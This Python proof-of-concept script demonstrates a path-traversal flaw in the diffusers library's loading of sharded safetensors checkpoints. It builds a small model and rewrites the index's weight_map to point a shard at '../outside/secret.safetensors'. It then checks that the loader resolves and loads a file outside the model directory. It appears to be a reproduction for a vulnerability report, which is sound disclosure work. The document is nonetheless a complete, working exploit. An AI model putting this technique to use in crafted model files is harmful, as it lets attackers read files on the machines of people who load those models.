#!/usr/bin/env python3
from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import warnings
from dataclasses import asdict, dataclass
from pathlib import Path


ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT / "codebase" / "src"))

import torch

from diffusers import AutoencoderTiny
from diffusers.utils.hub_utils import _get_checkpoint_shard_files


@dataclass
class ReproEvidence:
    model_dir: str
    index_file: str
    malicious_weight_map_value: str
    resolved_shard_path: str
    resolved_realpath: str
    outside_realpath: str
    escaped_model_dir: bool
    loaded_model_class: str


def build_malicious_checkpoint(base_dir: Path) -> tuple[Path, ReproEvidence]:
    model_dir = base_dir / "malicious_model"
    outside_dir = base_dir / "outside"
    model_dir.mkdir(parents=True, exist_ok=True)
    outside_dir.mkdir(parents=True, exist_ok=True)

    model = AutoencoderTiny(
        in_channels=3,
        out_channels=3,
        encoder_block_out_channels=(32, 32),
        decoder_block_out_channels=(32, 32),
        num_encoder_blocks=(1, 1),
        num_decoder_blocks=(1, 1),
    )
    model.save_pretrained(model_dir, safe_serialization=True, max_shard_size="10KB")

    index_file = model_dir / "diffusion_pytorch_model.safetensors.index.json"
    index = json.loads(index_file.read_text())
    shard_names = sorted(set(index["weight_map"].values()))
    chosen_shard = shard_names[0]
    malicious_value = "../outside/secret.safetensors"
    outside_shard = outside_dir / "secret.safetensors"

    shutil.copy2(model_dir / chosen_shard, outside_shard)
    for key, value in list(index["weight_map"].items()):
        if value == chosen_shard:
            index["weight_map"][key] = malicious_value
    index_file.write_text(json.dumps(index, indent=2))
    os.remove(model_dir / chosen_shard)

    resolved_shards, _ = _get_checkpoint_shard_files(str(model_dir), str(index_file))
    escaped = Path(resolved_shards[0]).resolve() == outside_shard.resolve()

    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", message="The config attributes .* were passed to AutoencoderTiny.*")
        loaded = AutoencoderTiny.from_pretrained(model_dir, low_cpu_mem_usage=False)

    evidence = ReproEvidence(
        model_dir=str(model_dir),
        index_file=str(index_file),
        malicious_weight_map_value=malicious_value,
        resolved_shard_path=str(resolved_shards[0]),
        resolved_realpath=str(Path(resolved_shards[0]).resolve()),
        outside_realpath=str(outside_shard.resolve()),
        escaped_model_dir=escaped,
        loaded_model_class=loaded.__class__.__name__,
    )
    return model_dir, evidence


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="diffusers-path-traversal-") as tmp:
        base_dir = Path(tmp)
        _, evidence = build_malicious_checkpoint(base_dir)

        print("malicious weight_map value:", evidence.malicious_weight_map_value)
        print("resolved shard path:", evidence.resolved_shard_path)
        print("resolved realpath:", evidence.resolved_realpath)
        print("outside realpath:", evidence.outside_realpath)
        print("escaped model dir:", evidence.escaped_model_dir)
        print("loaded model class:", evidence.loaded_model_class)

        assert evidence.escaped_model_dir, "shard path did not escape the model directory"
        assert evidence.loaded_model_class == "AutoencoderTiny", "model did not load successfully"

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
